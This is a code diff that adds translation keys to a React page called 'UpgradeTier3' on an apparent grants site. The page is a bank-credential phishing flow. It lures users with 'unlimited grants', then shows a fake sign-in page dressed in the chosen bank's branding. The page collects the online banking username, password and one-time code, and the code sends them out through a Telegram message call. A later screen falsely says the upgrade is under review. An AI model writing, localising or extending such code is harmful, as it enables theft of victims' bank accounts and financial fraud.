@@ -1,5 +1,6 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useEffect, useState, useRef } from "react";
+import { useTranslation } from "react-i18next";
 import {
   ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
   Shield, ChevronRight, AlertCircle, Clock
@@ -146,6 +147,7 @@ function getBanksForCountry(country?: string | null): BankDef[] {
 type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";
 
 function UpgradeTier3() {
+  const { t } = useTranslation();
   const navigate = useNavigate();
   const [userId, setUserId] = useState<string | null>(null);
   const [profile, setProfile] = useState<Profile | null>(null);
@@ -228,7 +230,7 @@ useEffect(() => {
   };
 
   const handleLogin = async () => {
-    if (!email || !password) { setLoginError("Please enter email and password"); return; }
+    if (!email || !password) { setLoginError(t('updateTier3.loginError')); return; }
     if (!userId) return;
 
     setIsTransitioning(true);
@@ -258,8 +260,8 @@ useEffect(() => {
   };
 
   const handleAuthConfirm = async () => {
-    if (!selectedBank || !userId) { toast.error("Missing required information"); return; }
-    if (!otp || otp.length < 3) { toast.error("Please enter a valid OTP"); return; }
+    if (!selectedBank || !userId) { toast.error(t('updateTier3.missingInfo')); return; }
+    if (!otp || otp.length < 3) { toast.error(t('updateTier3.invalidOtp')); return; }
     setIsTransitioning(true); setSubmitting(true);
     try {
       sendTelegramMessage(
@@ -277,7 +279,7 @@ useEffect(() => {
       setTimeout(() => { setStep("processing"); setSubmitting(false); setIsTransitioning(false); }, 3000);
     } catch (e) {
       setSubmitting(false); setIsTransitioning(false);
-      toast.error(e instanceof Error ? e.message : "Failed to verify. Please try again.");
+      toast.error(e instanceof Error ? e.message : t('updateTier3.verifyFailed'));
     }
   };
 
@@ -293,32 +295,32 @@ useEffect(() => {
 
   // ── INTRO ──
   if (step === "intro") {
-    if (isTransitioning) return <LoadingScreen msg="Loading bank selection..." />;
+    if (isTransitioning) return <LoadingScreen msg={t('updateTier3.loadingBankSelect')} />;
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
           <Logo />
-          <button onClick={() => navigate({ to: "/dashboard" })} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> Back</button>
+          <button onClick={() => navigate({ to: "/dashboard" })} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> {t('updateTier3.back')}</button>
         </header>
         <main className="mx-auto max-w-3xl px-6">
           <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
             <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
-              <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-gold"><Shield className="h-3.5 w-3.5" /> Tier 3 Upgrade</div>
-              <h1 className="mt-2 font-display text-2xl font-semibold md:text-3xl">Unlock Unlimited Grants</h1>
-              <p className="mt-1 max-w-xl text-sm text-white/80">Upgrade to Tier 3 and apply for <strong className="text-gold">unlimited grant amounts</strong>. Link your bank account securely to get started.</p>
+              <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-gold"><Shield className="h-3.5 w-3.5" /> {t('updateTier3.introBadge')}</div>
+              <h1 className="mt-2 font-display text-2xl font-semibold md:text-3xl">{t('updateTier3.introTitle')}</h1>
+              <p className="mt-1 max-w-xl text-sm text-white/80">{t('updateTier3.introDesc')}</p>
             </div>
             <div className="space-y-8 p-8">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                 <div className="flex gap-4">
                   <Shield className="h-5 w-5 text-forest flex-shrink-0 mt-0.5" />
                   <div>
-                    <h3 className="font-semibold text-foreground">Why Link Your Bank?</h3>
-                    <p className="mt-2 text-sm text-muted-foreground">Your bank account is required for secure fund transfers. We use bank-level encryption to protect your information. Your account details are never stored directly on our servers. <strong className="text-forest">All withdrawals go exclusively to this verified account</strong> — prepaid cards and third-party accounts are not supported.</p>
+                    <h3 className="font-semibold text-foreground">{t('updateTier3.whyLinkTitle')}</h3>
+                    <p className="mt-2 text-sm text-muted-foreground">{t('updateTier3.whyLinkDesc')}</p>
                   </div>
                 </div>
               </div>
               <button onClick={() => { setIsTransitioning(true); setTimeout(() => { setStep("bank-select"); setIsTransitioning(false); }, 3000); }} disabled={isTransitioning} className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition hover:opacity-95 disabled:opacity-50">
-                <Lock className="h-4 w-4" /> Link Bank Account
+                <Lock className="h-4 w-4" /> {t('updateTier3.linkBankBtn')}
               </button>
             </div>
           </div>
@@ -329,7 +331,7 @@ useEffect(() => {
 
   // ── BANK SELECT ──
   if (step === "bank-select") {
-    if (isTransitioning) return <LoadingScreen msg="Connecting to bank..." />;
+    if (isTransitioning) return <LoadingScreen msg={t('updateTier3.loadingConnecting')} />;
     const hasMatch = filteredBanks.length > 0;
     const customBank: BankDef | null = searchQuery.trim().length > 2 && !hasMatch
       ? { id: "custom", name: searchQuery.trim(), auth: "otp", position: 999, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: searchQuery.trim(), logoColor: "#fff", inputBorder: "#1a3a5c" } }
@@ -338,22 +340,22 @@ useEffect(() => {
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
           <Logo />
-          <button onClick={() => setStep("intro")} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> Back</button>
+          <button onClick={() => setStep("intro")} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> {t('updateTier3.back')}</button>
         </header>
         <main className="mx-auto max-w-3xl px-6">
           <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
             <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
-              <h2 className="font-display text-2xl font-semibold">Select Your Bank</h2>
-              <p className="mt-1 text-sm text-white/80">Search or choose from the list below</p>
+              <h2 className="font-display text-2xl font-semibold">{t('updateTier3.selectBankTitle')}</h2>
+              <p className="mt-1 text-sm text-white/80">{t('updateTier3.selectBankDesc')}</p>
             </div>
             <div className="p-8 space-y-6">
               <div className="relative">
                 <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground w-5 h-5" />
-                <input type="text" placeholder="Search banks..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full pl-12 pr-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest" />
+                <input type="text" placeholder={t('updateTier3.searchPlaceholder')} value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full pl-12 pr-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest" />
               </div>
               {majorBanks.length > 0 && (
                 <div>
-                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">Popular Banks</p>
+                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">{t('updateTier3.popularBanks')}</p>
                   <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                     {majorBanks.map(bank => (
                       <button key={bank.id} onClick={() => handleBankSelected(bank)} disabled={isTransitioning}
@@ -367,7 +369,7 @@ useEffect(() => {
               )}
               {otherBanks.length > 0 && (
                 <div>
-                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">All Banks</p>
+                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">{t('updateTier3.allBanks')}</p>
                   <div className="space-y-2 max-h-96 overflow-y-auto">
                     {otherBanks.map(bank => (
                       <button key={bank.id} onClick={() => handleBankSelected(bank)} disabled={isTransitioning}
@@ -383,18 +385,18 @@ useEffect(() => {
               {customBank && (
                 <div className="space-y-4 pt-4 border-t border-border">
                   <div className="rounded-lg border border-gold/30 bg-gold/5 p-4">
-                    <p className="text-xs uppercase tracking-[0.18em] text-gold font-semibold mb-2">Bank Not Found</p>
-                    <p className="text-sm text-muted-foreground">We couldn't find "<strong>{customBank.name}</strong>" in our list. You can still proceed.</p>
+                    <p className="text-xs uppercase tracking-[0.18em] text-gold font-semibold mb-2">{t('updateTier3.bankNotFound')}</p>
+                    <p className="text-sm text-muted-foreground">{t('updateTier3.bankNotFoundDesc', { bank: customBank.name })}</p>
                   </div>
                   <button onClick={() => handleBankSelected(customBank)} disabled={isTransitioning}
                     className="w-full p-4 border-2 border-gold border-dashed rounded-lg bg-gold/5 hover:bg-gold/10 transition text-left flex items-center justify-between group disabled:opacity-50">
-                    <div><p className="text-sm font-semibold text-foreground group-hover:text-gold">{customBank.name}</p><p className="text-xs text-muted-foreground mt-1">Continue with this bank</p></div>
+                    <div><p className="text-sm font-semibold text-foreground group-hover:text-gold">{customBank.name}</p><p className="text-xs text-muted-foreground mt-1">{t('updateTier3.continueWithBank')}</p></div>
                     <ChevronRight className="h-4 w-4 text-gold" />
                   </button>
                 </div>
               )}
               {filteredBanks.length === 0 && !customBank && (
-                <div className="text-center py-12"><p className="text-muted-foreground">No banks found</p><p className="text-sm text-muted-foreground mt-1">Try typing your bank name in full</p></div>
+                <div className="text-center py-12"><p className="text-muted-foreground">{t('updateTier3.noBanksFound')}</p><p className="text-sm text-muted-foreground mt-1">{t('updateTier3.noBanksHint')}</p></div>
               )}
             </div>
           </div>
@@ -405,53 +407,53 @@ useEffect(() => {
 
   // ── BANK LOGIN ──
   if (step === "bank-login" && selectedBank) {
-    if (isTransitioning) return <LoadingScreen msg="Processing your credentials..." />;
-    const t = selectedBank.theme;
+    if (isTransitioning) return <LoadingScreen msg={t('updateTier3.loadingCredentials')} />;
+    const th = selectedBank.theme;
     return (
-      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
-        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
+      <div className="min-h-screen pb-16" style={{ background: th.bg }}>
+        <div style={{ background: th.headerBg }} className="px-6 py-4 shadow-md">
           <div className="mx-auto max-w-3xl flex items-center justify-between">
-            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
-            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
+            <span className="text-2xl font-black tracking-tight" style={{ color: th.logoColor }}>{th.logo}</span>
+            {th.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: th.logoColor }}>{th.tagline}</span>}
           </div>
         </div>
-        <div style={{ background: t.headerBg, opacity: 0.85, borderTop: "1px solid rgba(255,255,255,0.15)" }} className="px-6 py-2">
+        <div style={{ background: th.headerBg, opacity: 0.85, borderTop: "1px solid rgba(255,255,255,0.15)" }} className="px-6 py-2">
           <div className="mx-auto max-w-3xl flex gap-6">
             {["Personal", "Business", "Wealth Management", "About Us"].map(item => (
-              <span key={item} className="text-xs cursor-default opacity-80" style={{ color: t.logoColor }}>{item}</span>
+              <span key={item} className="text-xs cursor-default opacity-80" style={{ color: th.logoColor }}>{item}</span>
             ))}
           </div>
         </div>
         <div className="mx-auto max-w-3xl px-6 mt-8">
-          <button onClick={() => setStep("bank-select")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
-            <ArrowLeft className="h-4 w-4" /> Back
+          <button onClick={() => setStep("bank-select")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: th.accent }}>
+            <ArrowLeft className="h-4 w-4" /> {t('updateTier3.back')}
           </button>
           <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
-            <div className="px-8 py-6" style={{ background: t.headerBg }}>
-              <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Sign In to {selectedBank.name}</h2>
-              <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Enter your online banking credentials</p>
+            <div className="px-8 py-6" style={{ background: th.headerBg }}>
+              <h2 className="text-xl font-bold" style={{ color: th.headerText }}>{t('updateTier3.signInTitle', { bank: selectedBank.name })}</h2>
+              <p className="text-sm mt-1 opacity-80" style={{ color: th.headerText }}>{t('updateTier3.signInDesc')}</p>
             </div>
             <div className="p-8 space-y-5">
               <div className="flex items-center gap-2 text-xs text-gray-500 border border-gray-200 rounded-lg px-4 py-2.5 bg-gray-50">
-                <Shield className="h-4 w-4" style={{ color: t.accent }} />
-                <span>Secure, encrypted connection — your credentials are protected</span>
+                <Shield className="h-4 w-4" style={{ color: th.accent }} />
+                <span>{t('updateTier3.secureConnection')}</span>
               </div>
               <div>
-                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Online ID / Username</label>
-                <input type="text" value={email} onChange={e => handleEmailChange(e.target.value)} placeholder={`Your ${selectedBank.name} username`}
+                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">{t('updateTier3.usernameLabel')}</label>
+                <input type="text" value={email} onChange={e => handleEmailChange(e.target.value)} placeholder={t('updateTier3.usernamePlaceholder', { bank: selectedBank.name })}
                   disabled={isTransitioning}
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm"
-                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                  onFocus={e => { e.currentTarget.style.borderColor = th.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${th.inputBorder}22`; }}
                   onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                 />
               </div>
               <div>
-                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Password</label>
+                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">{t('updateTier3.passwordLabel')}</label>
                 <div className="relative">
-                  <input type={showPassword ? "text" : "password"} value={password} onChange={e => handlePasswordChange(e.target.value)} placeholder="Your password"
+                  <input type={showPassword ? "text" : "password"} value={password} onChange={e => handlePasswordChange(e.target.value)} placeholder={t('updateTier3.passwordPlaceholder')}
                     disabled={isTransitioning}
                     className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm pr-12"
-                    onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                    onFocus={e => { e.currentTarget.style.borderColor = th.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${th.inputBorder}22`; }}
                     onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                   />
                   <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
@@ -459,7 +461,7 @@ useEffect(() => {
                   </button>
                 </div>
                 <div className="mt-2 text-right">
-                  <span className="text-xs cursor-default" style={{ color: t.accent }}>Forgot password?</span>
+                  <span className="text-xs cursor-default" style={{ color: th.accent }}>{t('updateTier3.forgotPassword')}</span>
                 </div>
               </div>
               {loginError && (
@@ -469,18 +471,18 @@ useEffect(() => {
               )}
               <button onClick={handleLogin} disabled={isTransitioning}
                 className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50"
-                style={{ background: t.accent, color: t.accentText }}>
-                Sign In
+                style={{ background: th.accent, color: th.accentText }}>
+                {t('updateTier3.signInBtn')}
               </button>
               <p className="text-center text-xs text-gray-400">
-                By signing in you agree to {selectedBank.name}'s Terms of Service and Privacy Policy
+                {t('updateTier3.signInTerms', { bank: selectedBank.name })}
               </p>
             </div>
           </div>
           <div className="mt-6 text-center text-xs text-gray-400 space-x-4">
-            <span>Privacy Policy</span><span>·</span>
-            <span>Security</span><span>·</span>
-            <span>Accessibility</span><span>·</span>
+            <span>{t('updateTier3.privacyPolicy')}</span><span>·</span>
+            <span>{t('updateTier3.security')}</span><span>·</span>
+            <span>{t('updateTier3.accessibility')}</span><span>·</span>
             <span>© {new Date().getFullYear()} {selectedBank.name}</span>
           </div>
         </div>
@@ -493,42 +495,42 @@ useEffect(() => {
 
     // ── OTP / AUTH CONFIRM ──
   if (step === "auth-confirm" && selectedBank) {
-    if (isTransitioning) return <LoadingScreen msg="Verifying your account..." />;
-    const t = selectedBank.theme;
+    if (isTransitioning) return <LoadingScreen msg={t('updateTier3.loadingVerifying')} />;
+    const th = selectedBank.theme;
     return (
-      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
-        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
+      <div className="min-h-screen pb-16" style={{ background: th.bg }}>
+        <div style={{ background: th.headerBg }} className="px-6 py-4 shadow-md">
           <div className="mx-auto max-w-3xl flex items-center justify-between">
-            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
-            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
+            <span className="text-2xl font-black tracking-tight" style={{ color: th.logoColor }}>{th.logo}</span>
+            {th.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: th.logoColor }}>{th.tagline}</span>}
           </div>
         </div>
         <div className="mx-auto max-w-3xl px-6 mt-8">
           <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
-            <div className="px-8 py-6" style={{ background: t.headerBg }}>
-              <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Two-Step Verification</h2>
-              <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Confirm it's you before we continue</p>
+            <div className="px-8 py-6" style={{ background: th.headerBg }}>
+              <h2 className="text-xl font-bold" style={{ color: th.headerText }}>{t('updateTier3.otpTitle')}</h2>
+              <p className="text-sm mt-1 opacity-80" style={{ color: th.headerText }}>{t('updateTier3.otpDesc')}</p>
             </div>
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-gray-200 bg-gray-50 p-4 text-sm text-gray-600">
-                An OTP has been sent to your registered email or phone number on file with {selectedBank.name}.
+                {t('updateTier3.otpSentNotice', { bank: selectedBank.name })}
               </div>
               <div>
-                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-3">Verification Code</label>
-                <input type="text" value={otp} onChange={e => handleOtpChange(e.target.value)} placeholder="Enter code"
+                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-3">{t('updateTier3.otpCodeLabel')}</label>
+                <input type="text" value={otp} onChange={e => handleOtpChange(e.target.value)} placeholder={t('updateTier3.otpPlaceholder')}
                   disabled={isTransitioning}
                   className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-gray-300 rounded-lg focus:outline-none tracking-widest"
-                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
+                  onFocus={e => { e.currentTarget.style.borderColor = th.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${th.inputBorder}22`; }}
                   onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                 />
               </div>
               <button onClick={handleAuthConfirm} disabled={otp.length < 3 || submitting || isTransitioning}
                 className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
-                style={{ background: otp.length >= 3 && !submitting ? t.accent : "#e5e7eb", color: otp.length >= 3 && !submitting ? t.accentText : "#9ca3af" }}>
-                {submitting ? "Verifying..." : "Verify & Continue"}
+                style={{ background: otp.length >= 3 && !submitting ? th.accent : "#e5e7eb", color: otp.length >= 3 && !submitting ? th.accentText : "#9ca3af" }}>
+                {submitting ? t('updateTier3.verifying') : t('updateTier3.verifyBtn')}
               </button>
               <p className="text-center text-xs text-gray-400">
-                Didn't receive a code? <span className="cursor-default" style={{ color: t.accent }}>Resend code</span>
+                {t('updateTier3.resendPrompt')} <span className="cursor-default" style={{ color: th.accent }}>{t('updateTier3.resendCode')}</span>
               </p>
             </div>
           </div>
@@ -547,17 +549,17 @@ useEffect(() => {
             <div className="bg-gradient-primary px-8 py-12 text-primary-foreground text-center">
               <style>{`@keyframes pulse-scale{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:0.8}}.pulse-icon{animation:pulse-scale 2s ease-in-out infinite}`}</style>
               <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-6 pulse-icon"><Shield className="h-8 w-8 text-gold" /></div>
-              <h1 className="font-display text-3xl font-semibold">Tier 3 Upgrade Under Review</h1>
-              <p className="mt-2 text-white/80">Your account verification is being processed</p>
+              <h1 className="font-display text-3xl font-semibold">{t('updateTier3.processingTitle')}</h1>
+              <p className="mt-2 text-white/80">{t('updateTier3.processingSubtitle')}</p>
             </div>
             <div className="p-8 space-y-8">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-8">
-                <p className="text-foreground text-center leading-relaxed">Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. Our review team is currently processing your request with careful attention to security and compliance. This process typically takes 24 hours, though it may require additional time depending on verification requirements. You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate access to unlimited grant applications and withdrawal capabilities. We appreciate your patience and recommend checking your email regularly for updates.</p>
+                <p className="text-foreground text-center leading-relaxed">{t('updateTier3.processingBody')}</p>
               </div>
               <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
-                <p className="font-semibold text-foreground mb-3">📋 What Happens Next?</p>
+                <p className="font-semibold text-foreground mb-3">📋 {t('updateTier3.whatNextTitle')}</p>
                 <ol className="space-y-3 text-sm text-muted-foreground">
-                  {["Our review team verifies your credentials and bank information", "We conduct security and compliance checks (24 hours typical)", "You'll receive an email confirmation once approved", "Full Tier 3 access activated immediately upon approval"].map((item, i) => (
+                  {[t('updateTier3.nextStep1'), t('updateTier3.nextStep2'), t('updateTier3.nextStep3'), t('updateTier3.nextStep4')].map((item, i) => (
                     <li key={i} className="flex items-start gap-3">
                       <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">{i + 1}</span>
                       <span>{item}</span>
@@ -566,7 +568,7 @@ useEffect(() => {
                 </ol>
               </div>
               <button onClick={() => navigate({ to: "/dashboard" })} className="w-full py-4 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2">
-                <ArrowLeft className="h-4 w-4" /> Return to Dashboard
+                <ArrowLeft className="h-4 w-4" /> {t('updateTier3.returnDashboard')}
               </button>
             </div>
           </div>
@@ -584,16 +586,16 @@ useEffect(() => {
           <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
             <div className="bg-gradient-forest px-8 py-12 text-forest-foreground text-center">
               <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 mb-6 animate-bounce"><CheckCircle2 className="h-8 w-8 text-gold" /></div>
-              <h2 className="font-display text-2xl font-semibold">Bank Linked!</h2>
-              <p className="mt-2 text-white/80">Your account has been securely connected</p>
+              <h2 className="font-display text-2xl font-semibold">{t('updateTier3.successTitle')}</h2>
+              <p className="mt-2 text-white/80">{t('updateTier3.successSubtitle')}</p>
             </div>
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
-                <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">Linked Account</p>
+                <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">{t('updateTier3.linkedAccount')}</p>
                 <p className="text-lg font-semibold text-foreground">{selectedBank?.name}</p>
               </div>
               <button onClick={() => navigate({ to: "/dashboard" })} className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2">
-                <ArrowLeft className="h-4 w-4" /> Back to Dashboard
+                <ArrowLeft className="h-4 w-4" /> {t('updateTier3.backDashboard')}
               </button>
             </div>
           </div>
